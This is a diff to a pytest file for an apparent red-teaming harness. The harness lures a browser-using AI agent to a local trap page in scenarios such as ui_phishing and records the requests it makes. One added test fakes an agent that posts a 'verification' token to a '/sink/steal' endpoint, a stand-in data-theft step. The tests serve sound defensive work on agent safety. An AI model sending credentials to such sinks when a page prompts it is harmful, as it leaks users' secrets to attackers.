@@ -1,6 +1,9 @@
 """Tests for BrowserProbe.run — the WS handler that drives the target browser-using agent."""
 from __future__ import annotations
 
+import re
+from urllib.parse import urlsplit
+
 import pytest
 from unittest.mock import AsyncMock, MagicMock, patch
 
@@ -23,6 +26,7 @@ async def test_browser_probe_serves_scenario_url_and_drives_agent():
     mock_server = AsyncMock()
     mock_server.start = AsyncMock(return_value="http://127.0.0.1:18080/scenario")
     mock_server.stop = AsyncMock()
+    mock_server.evidence = MagicMock(return_value={"interaction_count": 0, "page_loads": 0, "trap_requests": []})
     mock_agent = AsyncMock()
     mock_agent.run = AsyncMock(return_value={"final_text": "agent followed the link", "screenshots": []})
 
@@ -43,6 +47,7 @@ async def _run_and_capture(msg):
     mock_server = AsyncMock()
     mock_server.start = AsyncMock(return_value="http://127.0.0.1:18080/scenario")
     mock_server.stop = AsyncMock()
+    mock_server.evidence = MagicMock(return_value={"interaction_count": 0, "page_loads": 0, "trap_requests": []})
     mock_agent = AsyncMock()
     mock_agent.run = AsyncMock(return_value={"final_text": "done", "screenshots": []})
     with patch("redteam_runner.browser_probe._make_scenario_server", return_value=mock_server) as mk_server, \
@@ -100,8 +105,9 @@ async def test_trap_options_in_message_set_bind_and_advertised_url():
 
         async def run(self):
             # The public URL is fake, so fetch the page from the bind address instead.
+            path = urlsplit(self.scenario_url).path
             async with aiohttp.ClientSession(trust_env=False) as c:
-                async with c.get(f"http://127.0.0.1:{port}/scenario") as r:
+                async with c.get(f"http://127.0.0.1:{port}{path}") as r:
                     seen["status"], seen["page"] = r.status, await r.text()
             seen["url"] = self.scenario_url
             return {"final_text": "done", "screenshots": []}
@@ -114,7 +120,65 @@ async def test_trap_options_in_message_set_bind_and_advertised_url():
     with patch("redteam_runner.browser_probe._make_target_agent_driver",
                side_effect=lambda agent_url, scenario_url, prompt, timeout_s: FakeDriver(scenario_url)):
         result = await BrowserProbe().run(msg)
-    assert seen["url"] == "http://trap.example.test:9999/scenario"
-    assert result["trap_url"] == "http://trap.example.test:9999/scenario"
+    assert re.fullmatch(r"http://trap\.example\.test:9999/[A-Za-z0-9_-]{16}/scenario", seen["url"])
+    assert result["trap_url"] == seen["url"]
     assert seen["status"] == 200
     assert "TRAP_MARKER_42" in seen["page"]
+
+
+@pytest.mark.asyncio
+async def test_reply_carries_trap_evidence_of_requests_the_agent_made():
+    import httpx
+
+    class PostingDriver:
+        def __init__(self, scenario_url):
+            self.sink = scenario_url.rsplit("/scenario", 1)[0] + "/sink/steal"
+
+        async def run(self):
+            async with httpx.AsyncClient(trust_env=False) as c:
+                await c.post(self.sink, data={"verification": "tok-123"})
+            return {"final_text": "done", "screenshots": []}
+
+    msg = {"scenario_kind": "ui_phishing", "agent_url": "http://t/agent",
+           "payload": "{sink_url}/steal", "timeout_s": 30}
+    with patch("redteam_runner.browser_probe._make_target_agent_driver",
+               side_effect=lambda a, scenario_url, p, t: PostingDriver(scenario_url)):
+        result = await BrowserProbe().run(msg)
+    assert result["trap_evidence"] == {
+        "interaction_count": 1, "page_loads": 0,
+        "trap_requests": [{"method": "POST", "path": "/sink/steal", "query": "",
+                           "body": "verification=tok-123", "complete": True}],
+    }
+
+
+@pytest.mark.asyncio
+async def test_trap_server_cap_order_head_and_raw_query():
+    import asyncio
+
+    import httpx
+    from redteam_runner.server import ScenarioServer
+
+    async def slow(delay, data):
+        await asyncio.sleep(delay)
+        yield data
+
+    server = ScenarioServer(render_fn=lambda: ("<p>x</p>", "text/html"))
+    base = (await server.start()).rsplit("/scenario", 1)[0]
+    try:
+        async with httpx.AsyncClient(trust_env=False, timeout=30) as c:
+            await c.head(f"{base}/scenario")
+            first = asyncio.create_task(c.post(f"{base}/sink/first", content=slow(0.5, b"late")))
+            await asyncio.sleep(0.2)
+            await c.get(f"{base}/sink/second?q=a%26b%3Dc%40")
+            await first
+            await asyncio.gather(*(
+                c.post(f"{base}/sink/n{i}", content=slow(0.2, b"x")) for i in range(80)
+            ))
+        ev = server.evidence()
+    finally:
+        await server.stop()
+    assert ev["page_loads"] == 0
+    assert [r["path"] for r in ev["trap_requests"]][:2] == ["/sink/first", "/sink/second"]
+    assert len(ev["trap_requests"]) == 50
+    assert ev["trap_requests"][0]["body"] == "late"
+    assert ev["trap_requests"][1]["query"] == "q=a%26b%3Dc%40"
